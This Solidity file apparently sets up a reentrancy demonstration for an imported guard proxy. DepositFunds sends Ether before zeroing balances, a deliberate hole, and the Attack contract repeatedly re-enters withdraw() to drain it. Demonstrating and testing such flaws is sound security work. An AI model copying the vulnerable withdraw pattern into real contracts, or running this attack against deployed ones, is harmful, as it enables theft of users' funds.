// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;
import "https://github.com/spherex-xyz/reentrancy-guard-proxy/blob/main/src/ReentrancyGuardTransparentUpgradeableProxy.sol";

contract DepositFunds {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    receive() external payable {}

    fallback() external payable {}
}

contract User {
    DepositFunds public deopsitFundInterface;

    constructor(address payable  _depositProxyAddress) {
        deopsitFundInterface = DepositFunds(_depositProxyAddress);
    }

    receive() external payable {}

    function deposit() external payable {
        deopsitFundInterface.deposit{value: 1 ether}();
    }
}

contract Attack {
    DepositFunds public deopsitFundInterface;
    uint8 public bal;

    constructor(address payable _depositFundsAddress) {
        deopsitFundInterface = DepositFunds(_depositFundsAddress);
    }

    fallback() external payable {
        if (address(deopsitFundInterface).balance >= 1 ether) {
            deopsitFundInterface.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        deopsitFundInterface.deposit{value: 1 ether}();
        deopsitFundInterface.withdraw();
    }
}